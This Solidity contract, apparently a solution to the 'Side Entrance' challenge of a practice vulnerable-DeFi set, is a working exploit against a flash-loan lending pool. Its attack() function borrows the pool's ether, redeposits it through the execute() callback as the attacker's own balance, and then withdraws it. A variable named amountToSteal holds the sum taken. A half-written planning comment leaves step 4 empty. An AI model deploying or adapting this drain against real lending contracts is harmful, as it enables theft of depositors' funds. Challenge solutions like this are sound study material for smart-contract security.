// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract SideEntranceExploiter {

    /**
     * Proposed attach 1:
     * 1 - Deposit small amount of ETH
     * 2 - Make flashloan to try and overflow deposit
     * 3 - Make another flashloan of ~999ETH
     * 4 - 
     */

    address private lendingPoolAddress;
    uint256 private amountToSteal;

    constructor(address _lendingPoolAddress) {
        lendingPoolAddress = _lendingPoolAddress;
    }

    function attack(uint256 amount) external {
        amountToSteal = amount;
        bytes memory payload = abi.encodeWithSignature("flashLoan(uint256)", amountToSteal);
        address(lendingPoolAddress).call(payload);

        bytes memory withdrawPayload = abi.encodeWithSignature("withdraw()");
        address(lendingPoolAddress).call(withdrawPayload);
    }

    function execute() external payable {
        // Called from lending pool
        bytes memory payload = abi.encodeWithSignature("deposit()");
        address(lendingPoolAddress).call{value: amountToSteal}(payload);
    }

    receive() external payable {
        // React to receiving ether
    }
}